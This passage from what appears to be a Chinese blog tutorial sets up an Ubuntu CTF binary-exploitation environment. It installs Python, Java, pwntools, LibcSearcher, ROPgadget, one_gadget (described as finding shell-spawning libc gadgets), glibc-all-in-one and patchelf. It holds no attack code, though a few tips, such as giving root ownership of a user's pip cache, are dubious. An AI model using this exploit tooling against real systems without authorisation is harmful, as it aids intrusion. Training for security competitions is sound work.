libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载：<a href="https://www.python.org/ftp/python/3.9.13/Python-3.9.13.tgz">Python Release Python 3.9.13 | Python.org</a></p><p>解压并编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> Python-3.9.13.tgz<span class="token builtin class-name">cd</span> Python-3.9.13<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.9 下</span><span class="token comment"># --with-pydebug 添加调试工具</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.9 --with-pydebug --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置 python 3.9.13 和 pip 3.9：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/python3.9  /usr/bin/python3.9$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/pip3.9  /usr/bin/pip3.9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果出现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The directory <span class="token string">'/home/wyy/.cache/pip/http'</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want <span class="token function">sudo</span><span class="token string">'s -H flag.The directory '</span>/home/wyy/.cache/pip<span class="token string">' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo'</span>s <span class="token parameter variable">-H</span> flag.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意修改为自己的用户名</span><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/<span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/http/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="管理多个版本的-Python"><a href="#管理多个版本的-Python" class="headerlink" title="管理多个版本的 Python"></a>管理多个版本的 Python</h2><blockquote><p>使用 <code>update-alternatives</code> 来切换终端中 <code>python</code> 指令所对应的 python 版本</p></blockquote><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python2.7 <span class="token number">1</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python3.5 <span class="token number">2</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/local/python3.9/bin/python3.9 <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后数字为对应 python 版本优先级，数值越大，优先级越高</p><p>快速切换 python 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">有 <span class="token number">3</span> 个候选项可用于替换 python <span class="token punctuation">(</span>提供 /usr/bin/python<span class="token punctuation">)</span>。  选择       路径                              优先级  状态------------------------------------------------------------* <span class="token number">0</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         自动模式  <span class="token number">1</span>            /usr/bin/python2.7                   <span class="token number">1</span>         手动模式  <span class="token number">2</span>            /usr/bin/python3.5                   <span class="token number">2</span>         手动模式  <span class="token number">3</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         手动模式要维持当前值<span class="token punctuation">[</span>*<span class="token punctuation">]</span>请按<span class="token operator">&lt;</span>回车键<span class="token operator">></span>，或者键入选择的编号：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择需要切换的 python 版本即可</p><hr><h1 id="Java-配置"><a href="#Java-配置" class="headerlink" title="Java 配置"></a>Java 配置</h1><blockquote><p><code>open-jdk</code> 和 <code>oracle-jdk</code> 选其一即可，<code>oracle-jdk</code> 相对来说更稳定一点</p></blockquote><h2 id="安装-open-jdk"><a href="#安装-open-jdk" class="headerlink" title="安装 open-jdk"></a>安装 open-jdk</h2><p>查找 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> search openjdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以安装 open-jdk 8 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openjdk-8-jdk<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看已安装的 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> list <span class="token parameter variable">--installed</span> <span class="token operator">|</span> <span class="token function">grep</span> openjdk<span class="token comment"># 显示：</span><span class="token comment"># openjdk-11-jdk-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jdk/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装]</span><span class="token comment"># openjdk-11-jre-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jre/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载 open-jdk，以 open-jdk 11 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk-headless<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre-headless<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以同时使用 apt 安装多个版本的 open-jdk，然后使用如下命令切换 jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果我们只用 apt 安装过一个版本的 java，会显示无需配置</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-oracle-jdk"><a href="#安装-oracle-jdk" class="headerlink" title="安装 oracle-jdk"></a>安装 oracle-jdk</h2><p>官网下载 jdk 压缩包：<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a></p><p>以 oracle-jdk 8 为例，下载 <a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u381-b09/8c876547113c4e4aab3c868e9e0ec572/jdk-8u381-linux-x64.tar.gz">jdk-8u381-linux-x64.tar.gz</a></p><p>解压并移动到 <code>/usr/bin</code> 目录下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> vxf jdk-8u381-linux-x64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> jdk1.8.0_381 <span class="token function">java</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">mv</span> <span class="token function">java</span> /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/bin/java<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载只需删除 <code>/usr/bin/java</code> 目录即可</p><hr><h1 id="CTF-配置"><a href="#CTF-配置" class="headerlink" title="CTF 配置"></a>CTF 配置</h1><blockquote><p>回归正题，可以开始安装 CTF 所需要的环境了</p></blockquote><h2 id="安装-git"><a href="#安装-git" class="headerlink" title="安装 git"></a>安装 git</h2><blockquote><p>迟早要用到的</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果发现有时候网不行，github 项目 git 不下来或者 wget 不下来，无法连接，尝试 cdn 加速：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> url.<span class="token string">"https://ghproxy.com/https://github.com"</span>.insteadOf <span class="token string">"https://github.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--edit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除掉对应的配置即可</p><blockquote><p><strong>注意：官方是没有提供 cdn 的，因此上面的 cdn 链接都是用爱发电，可能某天就无法使用了</strong></p></blockquote><ul><li>也可以对 github.com 添加代理：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.https://github.com.proxy socks5://127.0.0.1:7890<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.https://github.com.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>取消代理即可</p><hr><h2 id="安装-32-位库"><a href="#安装-32-位库" class="headerlink" title="安装 32 位库"></a>安装 32 位库</h2><blockquote><p>运行 32 位的 ELF 可执行文件时需要</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg --add-architecture i386<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncurses5-dev lib32z1<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6:i386 libstdc++6:i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h2><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/aquynh/capstone /opt/capstone<span class="token builtin class-name">cd</span> /opt/capstone<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><blockquote><p>通过 pip 安装或通过 git 安装，两种方法都可以，选其一即可</p></blockquote><ul><li>通过 python 的 pip 安装</li></ul><p><strong>需要注意使用哪个版本的 python 的 pip 来安装</strong></p><p>如果安装了新版的 python，例如 python 3.10.6，那就需要将 <code>python</code> 修改为默认指向 python 3.10.6，因为 Ubuntu 16.04 中 <code>python</code> 默认指向 python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span class="token comment"># 或者直接安装pwn库，自带pwntools</span><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3.10 <span class="token function">install</span> pwntools<span class="token comment"># 或者直接安装pwn库，自带pwntools</span>pip3.10 <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>如果坚持使用系统自带的 python 3.5 来安装 pwntools 的话</p><p>因为 pip 默认版本只有 8，是无法直接安装 pwntools 的，报错<br>直接使用 <code>pip3 install --upgrade pip</code> 更新 pip 的话，会将 pip 更新到最新版，导致与 python 3.5 不匹配，报错</p><p>解决方法：<br>首先下载 python 3.5 的 <code>get-pip.py</code> 并进行 pip 更新<br>如果 wget 下载太慢，建议直接访问 <a href="https://bootstrap.pypa.io/pip/3.5/">https://bootstrap.pypa.io/pip/3.5/</a> 用科学上网进行下载<br>在进行 <code>python3.5 get-pip.py</code> 之前，请先更换 pip 源，否则会很痛苦</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py  python3.5 get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样会安装好 python 3.5 所支持的最新版 pip：pip-20.3.4</p><p>但在通过 pip 安装 pwntools 时，可能会报错：<code>ERROR: Failed building wheel for cffi</code></p><p>解决办法：<br>先安装 cffi 所需要的依赖：<code>sudo apt install libffi-dev</code><br>然后即可正常安装：<code>pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p><mark>建议还是直接安装 python 3.10 使用</mark></p></blockquote><ul><li>通过 git 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/Gallopsled/pwntools /opt/pwntools<span class="token builtin class-name">cd</span> /opt/pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为我没用这种方法，如果报错的话，请参照 GDB 配置一节中安装 pwndbg 的方法，去 <a href="https://github.com/Gallopsled/pwntools">Gallopsled&#x2F;pwntools: CTF framework and exploit development library (github.com)</a> 手动下载一个旧版本的 pwntools，然后编译安装</p><ul><li>验证安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token comment"># 打开python</span><span class="token comment"># 输入下面的代码，Ⅰ或Ⅱ选其一即可</span>-------------------------------------------<span class="token comment"># Ⅰ</span><span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># Ⅱ</span>from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># 如果输出的是这个，那就是安装成功了</span>输出：<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><p><strong>需要注意使用哪个版本的 python 的 pip 来安装</strong></p><p>如果安装了新版的 python，例如 python 3.10.6，那就需要将 <code>python</code> 修改为默认指向 python 3.10.6，因为 Ubuntu 16.04 中 <code>python</code> 默认指向 python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> LibcSearcher <span class="token parameter variable">-i</span> http://mirrors.aliyun.com/pypi/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><mark>Ubuntu 16.04 的 pip 使用清华源可能会出现 SSL 错误，建议使用阿里源：<code>http://mirrors.aliyun.com/pypi/simple/</code></mark></p><blockquote><p><strong>注意</strong>：<br>网上有很多通过 git 来安装的 <code>LibcSearcher</code> 在使用的时候会出现 “<code>libcsearcher No matched libc, please add more libc or try others</code>“ 的报错，通过 git 安装的那个版本可能不支持 python3，或者不是云端查找</p><p>我自己当初就是通过 git 安装，然后踩坑了，网上一大堆说删了 <code>Libcdatabase</code> 重新下载、通过 <code>./get</code> 更新的方法，但都行不通。。。</p></blockquote><hr><h2 id="安装-checksec"><a href="#安装-checksec" class="headerlink" title="安装 checksec"></a>安装 checksec</h2><blockquote><p>checksec 可用于识别二进制文件的安全属性，只是一个 sh 脚本，<mark>安装 pwntools 时自带，如果没有或者出现问题的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/slimm609/checksec.sh.git /opt/checksec.sh<span class="token builtin class-name">cd</span> /opt/checksec.sh<span class="token comment"># 直接创建软链接即可使用,</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /opt/checksec.sh/checksec /usr/local/bin/checksec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<em>创建软连接的指令中，两个路径都必须使用绝对路径</em>，否则会报如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">符号连接的层数过多: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用 checksec 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> not found: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可尝试使用上述方法通过 git 仓库创建软链接进行修复</p><p>当然还可以直接重装 pwntools，因为 checksec 一般是安装 pwntools 自带的，报错大概率与 pwntools 有关：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall pwntoolspip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><blockquote><p>用来找 gadget 的，<mark>这个安装 pwntools 时自带，如果没有的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget<span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果使用 ROPgadget 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"/usr/local/bin/ROPgadget"</span>, line <span class="token number">4</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    __import__<span class="token punctuation">(</span><span class="token string">'pkg_resources'</span><span class="token punctuation">)</span>.run_script<span class="token punctuation">(</span><span class="token string">'ROPGadget==7.3'</span>, <span class="token string">'ROPgadget'</span><span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">720</span>, <span class="token keyword">in</span> run_script    self.require<span class="token punctuation">(</span>requires<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.run_script<span class="token punctuation">(</span>script_name, ns<span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">1546</span>, <span class="token keyword">in</span> run_script    raise ResolutionError<span class="token punctuation">(</span>pkg_resources.ResolutionError: Script <span class="token string">'scripts/ROPgadget'</span> not found <span class="token keyword">in</span> metadata at <span class="token string">'/home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是 pwntools 自带的 ROPgadget 还是自己手动 git 安装的 ROPgadget，都将 ROPgadget 的 git 仓库下的 <code>scripts</code> 目录移动到<strong>报错的路径</strong>下即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果是 pwntools 自带的 ROPgadget, 首先需要将 ROPgadget 仓库 git 到本地</span><span class="token comment"># sudo git clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget</span><span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-r</span> scripts /home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以尝试查看 ROPgadget 的版本，并卸载重装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> ROPgadgetpip uninstall ROPgadgetpip <span class="token function">install</span> <span class="token assign-left variable">ROPgadget</span><span class="token operator">==</span>版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重装 ROPgadget 后若因为旧版本而导致 pip 产生警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Skipping /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info due to invalid metadata entry <span class="token string">'name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除该文件即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h2><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位<br>在做相关堆题时尤为有效，用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> ，一个 gadget 就可以 getshell，但需要注意 one_gadget 相关限制条件</p></blockquote><p>注意：one_gadget 需要安装 ruby <strong>（ruby &lt; 2.4 会导致 one_gadget 无法安装）</strong></p><p>最好是通过添加仓库的方式安装 ruby，Ubuntu 16.04 使用 <code>sudo apt install ruby</code> 安装的 ruby &lt; 2.4</p><p>通过添加仓库安装 ruby：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除旧版本 ruby</span><span class="token function">sudo</span> <span class="token function">apt</span> purge --auto-remove ruby<span class="token comment"># 添加仓库</span><span class="token function">sudo</span> add-apt-repository ppa:brightbox/ruby-ng<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token comment"># 指定 ruby 2.6 版本</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby2.6 ruby2.6-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装 one_gadget：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git /opt/glibc-all-in-one<span class="token builtin class-name">cd</span> /opt/glibc-all-in-one./update_list   <span class="token comment"># 获取可以更新的 glibc 的版本</span><span class="token function">cat</span> list   <span class="token comment"># 查看可下载的 glibc</span>./download 需要的libc版本   <span class="token comment"># 例如：2.31-0ubuntu9_amd64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认下载到 glibc-all-in-one 的 <code>/libs</code> 目录下</p><p>如果运行 <code>./update_list</code> 报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">requests.exceptions.ProxyError: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'mirror.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /ubuntu/pool/main/g/glibc/ <span class="token punctuation">(</span>Caused by ProxyError<span class="token punctuation">(</span><span class="token string">'Unable to connect to proxy'</span>, SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:997)'</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查 <code>urllib3</code> 库的版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> urllib3<span class="token comment"># urllib3            2.0.7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将 <code>urllib3</code> 库降级，即可解决：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall urllib3pip <span class="token function">install</span> <span class="token assign-left variable">urllib3</span><span class="token operator">==</span><span class="token number">1.25</span>.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-patchelf"><a href="#安装-patchelf" class="headerlink" title="安装 patchelf"></a>安装 patchelf</h2><blockquote><p>与 glibc-all-in-one 配合使用，可以用于更改 elf 文件 libc 版本</p></blockquote><ul><li>通过 apt 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>源码编译安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/NixOS/patchelf.git /opt/patchelf<span class="token builtin class-name">cd</span> /opt/patchelf<span class="token function">sudo</span> ./bootstrap.sh<span class="token function">sudo</span> ./configure<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> check<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># 验证安装：</span>patchelf <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>sudo ./bootstrap.sh</code> 可能会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./bootstrap.sh: <span class="token number">2</span>: ./bootstrap.sh: autoreconf: not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装所需的包：</p><pre class="line-numbers language-bash" data-language="bash"><code 